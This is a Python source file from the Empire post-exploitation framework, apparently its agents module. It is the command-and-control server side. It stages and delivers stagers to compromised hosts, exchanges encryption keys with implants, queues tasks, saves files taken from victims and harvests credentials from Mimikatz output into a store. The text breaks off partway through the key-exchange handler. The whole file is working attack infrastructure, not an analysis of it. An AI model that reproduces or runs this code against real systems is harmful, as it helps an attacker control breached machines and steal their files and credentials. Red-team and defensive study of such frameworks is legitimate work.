"""

Main agent handling functionality for Empire.

Database methods related to agents, as well as
the GET and POST handlers (process_get() and process_post()) 
used to process checkin and result requests.

handle_agent_response() is where the packets are parsed and
the response types are handled as appropriate.

"""

from pydispatch import dispatcher
import sqlite3
import pickle
import base64
import string
import os
import iptools

# Empire imports
import encryption
import helpers
import http
import packets
import messages


class Agents:

    def __init__(self, MainMenu, args=None):

        # pull out the controller objects
        self.mainMenu = MainMenu
        self.conn = MainMenu.conn
        self.listeners = None
        self.modules = None
        self.stager = None
        self.installPath = self.mainMenu.installPath

        self.args = args

        # internal agent dictionary for the client's session key and tasking/result sets
        #   self.agents[sessionID] = [  clientSessionKey, 
        #                               [tasking1, tasking2, ...],
        #                               [results1, results2, ...],
        #                               [tab-completable function names for a script-import],
        #                               current URIs,
        #                               old URIs
        #                            ]
        self.agents = {}

        # reinitialize any agents that already exist in the database
        agentIDs = self.get_agent_ids()
        for agentID in agentIDs:
            sessionKey = self.get_agent_session_key(agentID)
            functions = self.get_agent_functions_database(agentID)

            # get the current and previous URIs for tasking
            uris,old_uris = self.get_agent_uris(agentID)
            
            if not old_uris:
                old_uris = ""
            
            # [sessionKey, taskings, results, stored_functions, tasking uris, old uris]
            self.agents[agentID] = [sessionKey, [], [], functions, uris, old_uris]

        # pull out common configs from the main menu object in empire.py
        self.ipWhiteList = self.mainMenu.ipWhiteList
        self.ipBlackList = self.mainMenu.ipBlackList
        self.stage0 = self.mainMenu.stage0
        self.stage1 = self.mainMenu.stage1
        self.stage2 = self.mainMenu.stage2


    ###############################################################
    #
    # Misc agent methods
    #
    ###############################################################

    def remove_agent(self, sessionID):
        """
        Remove an agent to the internal cache and database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        # remove the agent from the internal cache
        self.agents.pop(sessionID, None)

        # remove an agent from the database
        cur = self.conn.cursor()
        cur.execute("DELETE FROM agents WHERE session_id like ?", [sessionID])
        cur.close()


    def add_agent(self, sessionID, externalIP, delay, jitter, profile, killDate, workingHours,lostLimit):
        """
        Add an agent to the internal cache and database.
        """

        cur = self.conn.cursor()

        currentTime = helpers.get_datetime()
        checkinTime = currentTime
        lastSeenTime = currentTime
        
        # generate a new key for this agent
        sessionKey = encryption.generate_aes_key()

        # config defaults, just in case something doesn't parse
        #   ...we shouldn't ever hit this...
        requestUris = "post.php"
        userAgent = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"
        additionalHeaders = ""

        # profile format ->     requestUris|user_agent|additionalHeaders
        parts = profile.split("|")
        if len(parts) == 2:
            requestUris = parts[0]
            userAgent = parts[1]
        elif len(parts) == 3:
            requestUris = parts[0]
            userAgent = parts[1]
            additionalHeaders = parts[2]

        cur.execute("INSERT INTO agents (name,session_id,delay,jitter,external_ip,session_key,checkin_time,lastseen_time,uris,user_agent,headers,kill_date,working_hours,lost_limit) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?)", (sessionID,sessionID,delay,jitter,externalIP,sessionKey,checkinTime,lastSeenTime,requestUris,userAgent,additionalHeaders,killDate,workingHours,lostLimit))
        cur.close()

        # initialize the tasking/result buffers along with the client session key
        sessionKey = self.get_agent_session_key(sessionID)
        self.agents[sessionID] = [sessionKey, [],[],[], requestUris, ""]

        # report the initial checkin in the reporting database
        cur = self.conn.cursor()
        cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp) VALUES (?,?,?,?)", (sessionID,"checkin",checkinTime,helpers.get_datetime()))
        cur.close()


    def is_agent_present(self, sessionID):
        """
        Check if the sessionID is currently in the cache.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        return sessionID in self.agents


    def is_uri_present(self, resource):
        """
        Check if the resource is currently in the uris or old_uris for any agent.
        """

        for option,values in self.agents.iteritems():
            if resource in values[-1] or resource in values [-2]:
                return True
        return False


    def is_ip_allowed(self, IP):
        """
        Check if the IP meshes with the whitelist/blacklist, if set.
        """

        if self.ipBlackList:
            if self.ipWhiteList:
                return IP in self.ipWhiteList and IP not in self.ipBlackList 
            else:
                return IP not in self.ipBlackList 
        if self.ipWhiteList:
            return IP in self.ipWhiteList
        else:
            return True


    def save_file(self, sessionID, path, data, append=False):
        """
        Save a file download for an agent to the appropriately constructed path.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_name(sessionID)
        if nameid : sessionID = nameid

        parts = path.split("\\")

        # construct the appropriate save path
        savePath =  self.installPath + "/downloads/"+str(sessionID)+"/" + "/".join(parts[0:-1])
        filename = parts[-1]

        # fix for 'skywalker' exploit by @zeroSteiner
        safePath = os.path.abspath("%s/downloads/%s/" %(self.installPath, sessionID))
        if not os.path.abspath(savePath+"/"+filename).startswith(safePath):
            dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" %(sessionID), sender="Agents")
            dispatcher.send("[!] attempted overwrite of %s with data %s" %(path, data), sender="Agents")
            return

        # make the recursive directory structure if it doesn't already exist
        if not os.path.exists(savePath):
            os.makedirs(savePath)

        # overwrite an existing file
        if not append:
           f = open(savePath+"/"+filename, 'wb')
        else:
            # otherwise append
            f = open(savePath+"/"+filename, 'ab')

        f.write(data)
        f.close()

        # notify everyone that the file was downloaded
        dispatcher.send("[+] Part of file %s from %s saved" %(filename, sessionID), sender="Agents")
    

    def save_module_file(self, sessionID, path, data):
        """
        Save a module output file to the appropriate path.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_name(sessionID)
        if nameid : sessionID = nameid

        parts = path.split("/")
        # construct the appropriate save path
        savePath =  self.installPath + "/downloads/"+str(sessionID)+"/" + "/".join(parts[0:-1])
        filename = parts[-1]

        # fix for 'skywalker' exploit by @zeroSteiner
        safePath = os.path.abspath("%s/downloads/%s/" %(self.installPath, sessionID))
        if not os.path.abspath(savePath+"/"+filename).startswith(safePath):
            dispatcher.send("[!] WARNING: agent %s attempted skywalker exploit!" %(sessionID), sender="Agents")
            dispatcher.send("[!] attempted overwrite of %s with data %s" %(path, data), sender="Agents")
            return

        # make the recursive directory structure if it doesn't already exist
        if not os.path.exists(savePath):
            os.makedirs(savePath)

        # save the file out
        f = open(savePath+"/"+filename, 'w')
        f.write(data)
        f.close()

        # notify everyone that the file was downloaded
        dispatcher.send("[+] File "+path+" from "+str(sessionID)+" saved", sender="Agents")

        return "/downloads/"+str(sessionID)+"/" + "/".join(parts[0:-1]) + "/" + filename


    def save_agent_log(self, sessionID, data):
        """
        Save the agent console output to the agent's log file.
        """

        name = self.get_agent_name(sessionID)

        savePath = self.installPath + "/downloads/"+str(name)+"/"

        # make the recursive directory structure if it doesn't already exist
        if not os.path.exists(savePath):
            os.makedirs(savePath)

        currentTime = helpers.get_datetime()
        
        f = open(savePath+"/agent.log", 'a')
        f.write("\n" + currentTime + " : " + "\n")
        f.write(data + "\n")
        f.close()


    ###############################################################
    #
    # Methods to get information from agent fields.
    #
    ###############################################################


    def get_agents(self):
        """
        Return all active agents from the database.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT * FROM agents")
        results = cur.fetchall()
        cur.close()
        return results


    def get_agent_names(self):
        """
        Return all names of active agents from the database.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT name FROM agents")
        results = cur.fetchall()
        cur.close()
        # make sure names all ascii encoded 
        results = [r[0].encode('ascii','ignore') for r in results]
        return results
     

    def get_agent_ids(self):
        """
        Return all IDs of active agents from the database.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT session_id FROM agents")
        results = cur.fetchall()
        cur.close()
        # make sure names all ascii encoded 
        results = [r[0].encode('ascii','ignore') for r in results]
        return results


    def get_agent(self, sessionID):
        """
        Return complete information for the specified agent from the database.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT * FROM agents WHERE session_id=?", [sessionID])
        agent = cur.fetchone()
        cur.close()
        return agent


    def get_agent_internal_ip(self, sessionID):
        """
        Return the internal IP for the agent from the database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid
        
        cur = self.conn.cursor()
        cur.execute("SELECT internal_ip FROM agents WHERE session_id=?", [sessionID])
        agent = cur.fetchone()
        cur.close()
        return agent


    def is_agent_elevated(self, sessionID):
        """
        Check whether a specific sessionID is currently elevated.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid
        
        cur = self.conn.cursor()
        cur.execute("SELECT high_integrity FROM agents WHERE session_id=?", [sessionID])
        elevated = cur.fetchone()
        cur.close()

        if elevated and elevated != None and elevated != ():
            return int(elevated[0]) == 1
        else:
            return False


    def get_ps_version(self, sessionID):
        """
        Return the current PowerShell version for this agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT ps_version FROM agents WHERE session_id=?", [sessionID])
        ps_version = cur.fetchone()
        cur.close()

        if ps_version and ps_version != None:
            if type(ps_version) is str:
                return sessionKey
            else:
                return ps_version[0]


    def get_agent_session_key(self, sessionID):
        """
        Return AES session key for this sessionID.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT session_key FROM agents WHERE session_id=?", [sessionID])
        sessionKey = cur.fetchone()
        cur.close()

        if sessionKey and sessionKey != None:
            if type(sessionKey) is str:
                return sessionKey
            else:
                return sessionKey[0]


    def get_agent_results(self, sessionID):
        """
        Get the agent's results buffer.
        """

        agentName = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent " + str(agentName) + " not active.")
        else:
            results = self.agents[sessionID][2]
            self.agents[sessionID][2] = []
            return "\n".join(results)


    def get_agent_id(self, name):
        """
        Get an agent sessionID based on the name.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT session_id FROM agents WHERE name=?", [name])
        results = cur.fetchone()
        if results:
            return results[0]
        else:
            return None


    def get_agent_name(self, sessionID):
        """
        Get an agent name based on sessionID.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT name FROM agents WHERE session_id=? or name = ?", [sessionID, sessionID])
        results = cur.fetchone()
        if results:
            return results[0]
        else:
            return None


    def get_agent_hostname(self, sessionID):
        """
        Get an agent's hostname based on sessionID.
        """

        cur = self.conn.cursor()
        cur.execute("SELECT hostname FROM agents WHERE session_id=? or name = ?", [sessionID, sessionID])
        results = cur.fetchone()
        if results:
            return results[0]
        else:
            return None



    ###############################################################
    #
    # Methods to update agent information fields.
    #
    ###############################################################

    def update_agent_results(self, sessionID, results):
        """
        Update the internal agent result cache.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        if sessionID in self.agents:
            self.agents[sessionID][2].append(results)
        else:
            dispatcher.send("[!] Non-existent agent " + str(sessionID) + " returned results", sender="Agents")


    def update_agent_sysinfo(self, sessionID, listener="", external_ip="", internal_ip="", username="", hostname="", os_details="", high_integrity=0, process_name="", process_id="", ps_version=""):
        """
        Update an agent's system information.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET listener = ?, internal_ip = ?, username = ?, hostname = ?, os_details = ?, high_integrity = ?, process_name = ?, process_id = ?, ps_version = ? WHERE session_id=?", [listener, internal_ip,username,hostname,os_details,high_integrity,process_name,process_id,ps_version,sessionID])
        cur.close()


    def update_agent_lastseen(self, sessionID):
        """
        Update the agent's last seen timestamp.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        currentTime = helpers.get_datetime()
        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET lastseen_time=? WHERE session_id=?", [currentTime, sessionID])
        cur.close()


    def update_agent_profile(self, sessionID, profile):
        """
        Update the agent's "uri1,uri2,...|useragent|headers" profile.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        parts = profile.strip("\"").split("|")
        cur = self.conn.cursor()

        # get the existing URIs from the agent and save them to
        # the old_uris field, so we can ensure that it can check in
        # to get the new URI tasking... bootstrapping problem :)
        cur.execute("SELECT uris FROM agents WHERE session_id=?", [sessionID])
        oldURIs = cur.fetchone()[0]

        if sessionID not in self.agents:
            print helpers.color("[!] Agent " + agentName + " not active.")
        else:
            # update the URIs in the cache
            self.agents[sessionID][-1] = oldURIs
            # new URIs
            self.agents[sessionID][-2] = parts[0]

        # if no additional headers
        if len(parts) == 2:
            cur.execute("UPDATE agents SET uris=?, user_agent=?, old_uris=? WHERE session_id=?", [parts[0], parts[1], oldURIs, sessionID])
        else:
            # if additional headers
            cur.execute("UPDATE agents SET uris=?, user_agent=?, headers=?, old_uris=? WHERE session_id=?", [parts[0], parts[1], parts[2], oldURIs, sessionID])

        cur.close()


    def rename_agent(self, oldname, newname):
        """
        Update the agent's last seen timestamp.
        """

        # rename the logging/downloads folder
        oldPath = self.installPath + "/downloads/"+str(oldname)+"/"
        newPath = self.installPath + "/downloads/"+str(newname)+"/"

        # check if the folder is already used
        if os.path.exists(newPath):
            print helpers.color("[!] Name already used by current or past agent.")
            return False
        else:
            # signal in the log that we've renamed the agent
            self.save_agent_log(oldname, "[*] Agent renamed from " + str(oldname) + " to " + str(newname))

            # move the old folder path to the new one
            if os.path.exists(oldPath):
                os.rename(oldPath, newPath)

            # rename the agent in the database
            cur = self.conn.cursor()
            cur.execute("UPDATE agents SET name=? WHERE name=?", [newname, oldname])
            cur.close()

            # report the agent rename in the reporting database
            cur = self.conn.cursor()
            cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp) VALUES (?,?,?,?)", (oldname,"rename",newname,helpers.get_datetime()))
            cur.close()

            return True


    def set_agent_field(self, field, value, sessionID):
        """
        Set field:value for a particular sessionID.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET "+str(field)+"=? WHERE session_id=?", [value, sessionID])
        cur.close()


    def set_agent_functions(self, sessionID, functions):
        """
        Set the tab-completable functions for the agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        if sessionID in self.agents:
            self.agents[sessionID][3] = functions
    
        functions = ",".join(functions)

        cur = self.conn.cursor()
        cur.execute("UPDATE agents SET functions=? WHERE session_id=?", [functions, sessionID])
        cur.close()


    def get_agent_functions(self, sessionID):
        """
        Get the tab-completable functions for an agent.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        if sessionID in self.agents:
            return self.agents[sessionID][3]
        else:
            return []


    def get_agent_functions_database(self, sessionID):
        """
        Get the tab-completable functions for an agent from the database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT functions FROM agents WHERE session_id=?", [sessionID])
        functions = cur.fetchone()[0]
        cur.close()
        if functions and functions != None:
            return functions.split(",")
        else:
            return []


    def get_agent_uris(self, sessionID):
        """
        Get the current and old URIs for an agent from the database.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        cur = self.conn.cursor()
        cur.execute("SELECT uris, old_uris FROM agents WHERE session_id=?", [sessionID])
        uris = cur.fetchone()
        cur.close()

        return uris


    ###############################################################
    #
    # Agent tasking methods
    #
    ###############################################################

    def add_agent_task(self, sessionID, taskName, task=""):
        """
        Add a task to the specified agent's buffer.
        """

        agentName = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent " + str(agentName) + " not active.")
        else:
            if sessionID:
                dispatcher.send("[*] Tasked " + str(sessionID) + " to run " + str(taskName), sender="Agents")
                self.agents[sessionID][1].append([taskName, task])

                # write out the last tasked script to "LastTask.ps1" if in debug mode
                if self.args and self.args.debug:
                    f = open(self.installPath + '/LastTask.ps1', 'w')
                    f.write(task)
                    f.close()

                # report the agent tasking in the reporting database
                cur = self.conn.cursor()
                cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp) VALUES (?,?,?,?)", (sessionID,"task",taskName + " - " + task[0:30],helpers.get_datetime()))
                cur.close()


    def get_agent_tasks(self, sessionID):
        """
        Retrieve tasks for our agent.
        """

        agentName = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        if sessionID not in self.agents:
            print helpers.color("[!] Agent " + str(agentName) + " not active.")
            return []
        else:
            tasks = self.agents[sessionID][1]
            # clear the taskings out
            self.agents[sessionID][1] = []
            return tasks


    def get_agent_task(self, sessionID):
        """
        Pop off the agent's top task.
        """

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_id(sessionID)
        if nameid : sessionID = nameid

        try:
            # pop the first task off the front of the stack
            return self.agents[sessionID][1].pop(0)
        except:
            []


    def clear_agent_tasks(self, sessionID):
        """
        Clear out the agent's task buffer.
        """

        agentName = sessionID

        if sessionID.lower() == "all":
            for option,values in self.agents.iteritems():
                self.agents[option][1] = []
        else:
            # see if we were passed a name instead of an ID
            nameid = self.get_agent_id(sessionID)
            if nameid : sessionID = nameid

            if sessionID not in self.agents:
                print helpers.color("[!] Agent " + agentName + " not active.")
            else:
                self.agents[sessionID][1] = []


    def handle_agent_response(self, sessionID, responseName, data):
        """
        Handle the result packet based on sessionID and responseName.
        """

        agentSessionID = sessionID
        agentName = sessionID

        # see if we were passed a name instead of an ID
        nameid = self.get_agent_name(sessionID)
        if nameid : sessionID = nameid

        # report the agent result in the reporting database
        cur = self.conn.cursor()
        cur.execute("INSERT INTO reporting (name,event_type,message,time_stamp) VALUES (?,?,?,?)", (agentSessionID,"result",responseName,helpers.get_datetime()))
        cur.close()


        # TODO: for heavy traffic packets, check these first (i.e. SOCKS?)
        #       so this logic is skipped

        if responseName == "ERROR":
            # error code
            dispatcher.send("[!] Received error response from " + str(sessionID), sender="Agents")
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, "[!] Error response: " + data)


        elif responseName == "TASK_SYSINFO":
            # sys info response -> update the host info
            parts = data.split("|")
            if len(parts) < 10:
                dispatcher.send("[!] Invalid sysinfo response from " + str(sessionID), sender="Agents")
            else:
                # extract appropriate system information
                listener = parts[0].encode('ascii','ignore')
                domainname = parts[1].encode('ascii','ignore')
                username = parts[2].encode('ascii','ignore')
                hostname = parts[3].encode('ascii','ignore')
                internal_ip = parts[4].encode('ascii','ignore')
                os_details = parts[5].encode('ascii','ignore')
                high_integrity = parts[6].encode('ascii','ignore')
                process_name = parts[7].encode('ascii','ignore')
                process_id = parts[8].encode('ascii','ignore')
                ps_version = parts[9].encode('ascii','ignore')
                
                if high_integrity == "True":
                    high_integrity = 1
                else:
                    high_integrity = 0

                username = str(domainname)+"\\"+str(username)

                # update the agent with this new information
                self.update_agent_sysinfo(sessionID, listener=listener, internal_ip=internal_ip, username=username, hostname=hostname, os_details=os_details, high_integrity=high_integrity,process_name=process_name, process_id=process_id, ps_version=ps_version)

                sysinfo = '{0: <18}'.format("Listener:") + listener + "\n"
                sysinfo += '{0: <18}'.format("Internal IP:") + internal_ip + "\n"
                sysinfo += '{0: <18}'.format("Username:") + username + "\n"
                sysinfo += '{0: <18}'.format("Hostname:") + hostname + "\n"
                sysinfo += '{0: <18}'.format("OS:") + os_details + "\n"
                sysinfo += '{0: <18}'.format("High Integrity:") + str(high_integrity) + "\n"
                sysinfo += '{0: <18}'.format("Process Name:") + process_name + "\n"
                sysinfo += '{0: <18}'.format("Process ID:") + process_id + "\n"
                sysinfo += '{0: <18}'.format("PSVersion:") + ps_version

                self.update_agent_results(sessionID, sysinfo)
                # update the agent log
                self.save_agent_log(sessionID, sysinfo)


        elif responseName == "TASK_EXIT":
            # exit command response
            
            # let everyone know this agent exited
            dispatcher.send(data, sender="Agents")

            # update the agent results and log
            # self.update_agent_results(sessionID, data)
            self.save_agent_log(sessionID, data)     

            # remove this agent from the cache/database
            self.remove_agent(sessionID)


        elif responseName == "TASK_SHELL":
            # shell command response
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_DOWNLOAD":
            # file download
            parts = data.split("|")
            if len(parts) != 3:
                dispatcher.send("[!] Received invalid file download response from " + sessionID, sender="Agents")
            else:
                index, path, data = parts
                # decode the file data and save it off as appropriate
                fileData = helpers.decode_base64(data)
                name = self.get_agent_name(sessionID)

                if index == "0":
                    self.save_file(name, path, fileData)
                else:
                    self.save_file(name, path, fileData, append=True)
                # update the agent log
                msg = "file download: " + str(path) + ", part: " + str(index)
                self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_UPLOAD": pass


        elif responseName == "TASK_GETJOBS":
            
            if not data or data.strip().strip() == "":
                data = "[*] No active jobs"

            # running jobs
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_STOPJOB":
            # job kill response
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_CMD_WAIT":

            # dynamic script output -> blocking
            self.update_agent_results(sessionID, data)

            # see if there are any credentials to parse
            time = helpers.get_datetime()
            creds = helpers.parse_credentials(data)

            if(creds):
                for cred in creds:

                    hostname = cred[4]
                    
                    if hostname == "":
                        hostname = self.get_agent_hostname(sessionID)

                    self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, cred[5], time)

            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_CMD_WAIT_SAVE":
            # dynamic script output -> blocking, save data
            name = self.get_agent_name(sessionID)

            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            fileData = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            savePath = prefix + "/" + helpers.get_file_datetime() + "." + extension
            finalSavePath = self.save_module_file(name, savePath, fileData)

            # update the agent log
            msg = "Output saved to ." + finalSavePath
            self.update_agent_results(sessionID, msg)
            self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_CMD_JOB":

            # dynamic script output -> non-blocking
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)
            
            # TODO: redo this regex for really large AD dumps
            #   so a ton of data isn't kept in memory...?
            parts = data.split("\n")
            if len(parts) > 10:
                time = helpers.get_datetime()
                if parts[0].startswith("Hostname:"):
                    # if we get Invoke-Mimikatz output, try to parse it and add
                    #   it to the internal credential store

                    # cred format: (credType, domain, username, password, hostname, sid, notes)
                    creds = helpers.parse_mimikatz(data)

                    for cred in creds:
                        hostname = cred[4]
                        
                        if hostname == "":
                            hostname = self.get_agent_hostname(sessionID)

                        self.mainMenu.credentials.add_credential(cred[0], cred[1], cred[2], cred[3], hostname, cred[5], time)


        elif responseName == "TASK_CMD_JOB_SAVE":
            # dynamic script output -> non-blocking, save data
            name = self.get_agent_name(sessionID)

            # extract the file save prefix and extension
            prefix = data[0:15].strip()
            extension = data[15:20].strip()
            fileData = helpers.decode_base64(data[20:])

            # save the file off to the appropriate path
            savePath = prefix + "/" + helpers.get_file_datetime() + "." + extension
            finalSavePath = self.save_module_file(name, savePath, fileData)

            # update the agent log
            msg = "Output saved to ." + finalSavePath
            self.update_agent_results(sessionID, msg)
            self.save_agent_log(sessionID, msg)


        elif responseName == "TASK_SCRIPT_IMPORT":
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        elif responseName == "TASK_SCRIPT_COMMAND":
            self.update_agent_results(sessionID, data)
            # update the agent log
            self.save_agent_log(sessionID, data)


        else:
            print helpers.color("[!] Unknown response " + str(responseName) + " from " +str(sessionID))


    ###############################################################
    #
    # HTTP processing handlers
    #
    ###############################################################

    def process_get(self, port, clientIP, sessionID, resource):
        """
        Process a GET request.
        """

        # check to make sure this IP is allowed
        if not self.is_ip_allowed(clientIP):
            dispatcher.send("[!] "+str(resource)+" requested by "+str(clientIP)+" on the blacklist/not on the whitelist.", sender="Agents")
            return (200, http.default_page())

        # see if the requested resource is in our valid task URI list
        if (self.is_uri_present(resource)):

            # if no session ID was supplied
            if not sessionID or sessionID == "":
                dispatcher.send("[!] "+str(resource)+" requested by "+str(clientIP)+" with no session ID.", sender="Agents")
                # return a 404 error code and no resource
                return (404, "")

            # if the sessionID doesn't exist in the cache
            # TODO: put this code before the URI present? ...
            if not self.is_agent_present(sessionID):
                dispatcher.send("[!] "+str(resource)+" requested by "+str(clientIP)+" with invalid session ID.", sender="Agents")
                return (404, "")

            # if the ID is currently in the cache, see if there's tasking for the agent
            else:
                
                # update the client's last seen time
                self.update_agent_lastseen(sessionID)

                # retrieve all agent taskings from the cache
                taskings = self.get_agent_tasks(sessionID)

                if taskings and taskings != []:

                    allTaskPackets = ""

                    # build tasking packets for everything we have
                    for tasking in taskings:
                        taskName, taskData = tasking
                        
                        # if there is tasking, build a tasking packet
                        taskPacket = packets.build_task_packet(taskName, taskData)
                        
                        allTaskPackets += taskPacket

                    # get the session key for the agent
                    sessionKey = self.agents[sessionID][0]

                    # encrypt the tasking packets with the agent's session key
                    encryptedData = encryption.aes_encrypt_then_mac(sessionKey, allTaskPackets)

                    return (200, encryptedData)

                # if no tasking for the agent
                else:
                    # just return the default page
                    return (200, http.default_page())

        # step 1 of negotiation -> client requests stage1 (stager.ps1)
        elif resource.lstrip("/").split("?")[0] == self.stage0:
            # return 200/valid and the initial stage code

            if self.args and self.args.debug:
                dispatcher.send("[*] Sending stager (stage 1) to "+str(clientIP), sender="Agents")

            # get the staging information for the given listener, keyed by port
            #   results: host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,istener_type,redirect_target,lost_limit
            config = self.listeners.get_staging_information(port=port)
            host = config[0]
            stagingkey = config[3]
            profile = config[6]
            stage = None

            # if we have a pivot or hop listener, use that config information instead for the stager
            if "?" in resource:
                parts = resource.split("?")
                if len(parts) == 2:
                    decoded = helpers.decode_base64(parts[1])

                    # http://server:port for a pivot listener
                    if decoded.count("/") == 2:
                        host = decoded
                    else:
                        # otherwise we have a http://server:port/hop.php listener
                        stage = self.stagers.generate_stager_hop(decoded, stagingkey, profile)

            if not stage:
                # generate the stage with appropriately patched information
                stage = self.stagers.generate_stager(host, stagingkey)

            # step 2 of negotiation -> return stager.ps1 (stage 1)
            return (200, stage)

        # default response
        else:
            # otherwise return the default page
            return (200, http.default_page())


    def process_post(self, port, clientIP, sessionID, resource, postData):
        """
        Process a POST request.
        """

        # check to make sure this IP is allowed
        if not self.is_ip_allowed(clientIP):
            dispatcher.send("[!] "+str(resource)+" requested by "+str(clientIP)+" on the blacklist/not on the whitelist.", sender="Agents")
            return (200, http.default_page())

        # check if requested resource in is session URIs for any agent profiles in the database
        if (self.is_uri_present(resource)):

            # if the sessionID doesn't exist in the database
            if not self.is_agent_present(sessionID):

                # alert everyone to an irregularity
                dispatcher.send("[!] Agent "+str(sessionID)+" posted results but isn't in the database!", sender="Agents")
                return (404, "")

            # if the ID is currently in the database, process the results
            else:

                # extract the agent's session key
                sessionKey = self.agents[sessionID][0]

                try:
                    # verify, decrypt and depad the packet
                    packet = encryption.aes_decrypt_and_verify(sessionKey, postData)

                    # update the client's last seen time
                    self.update_agent_lastseen(sessionID)

                    # process the packet and extract necessary data
                    #   [(responseName, counter, length, data), ...]
                    responsePackets = packets.parse_result_packets(packet)

                    counter = responsePackets[-1][1]

                    # validate the counter in the packet in the setcode.replace
                    if counter and packets.validate_counter(counter):
                        
                        for responsePacket in responsePackets:
                            (responseName, counter, length, data) = responsePacket
                            # process the agent's response
                            self.handle_agent_response(sessionID, responseName, data)

                        # signal that this agent returned results
                        name = self.get_agent_name(sessionID)
                        dispatcher.send("[*] Agent "+str(name)+" returned results.", sender="Agents")

                        # return a 200/valid
                        return (200, "")

                    else:
                        dispatcher.send("[!] Invalid counter value from "+str(sessionID), sender="Agents")
                        return (404, "")

                except Exception as e:
                    dispatcher.send("[!] Error processing result packet from "+str(sessionID), sender="Agents")
                    return (404, "")


        # step 3 of negotiation -> client posts public key
        elif resource.lstrip("/").split("?")[0] == self.stage1:

            if self.args and self.args.debug:
                dispatcher.send("[*] Agent "+str(sessionID)+" from "+str(clientIP)+" posted to public key URI", sender="Agents")

            # get the staging key for the given listener, keyed by port
            #   results: host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,lost_limit
            stagingKey = self.listeners.get_staging_information(port=port)[3]

            # decrypt the agent's public key
            message = encryption.aes_decrypt(stagingKey, postData)

            # strip non-printable characters
            message = ''.join(filter(lambda x:x in string.printable, message))

            # client posts RSA key
            if (len(message) < 400) or (not message.endswith("</RSAKeyValue>")):
                dispatcher.send("[!] Invalid key post format from "+str(sessionID), sender="Agents")
            else:
                # convert the RSA key from the stupid PowerShell export format
                rsaKey = encryption.rsa_xml_to_key(message)

                if(rsaKey):

                    if self.args and self.args.debug:
                        dispatcher.send("[*] Agent "+str(sessionID)+" from "+str(clientIP)+" posted valid RSA key", sender="Agents")

                    # get the epoch time to send to the client
                    epoch = packets.get_counter()

                    # get the staging key for the given listener, keyed by port
                    #   results: host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit
                    config = self.listeners.get_staging_information(port=port)
                    delay = config[4]
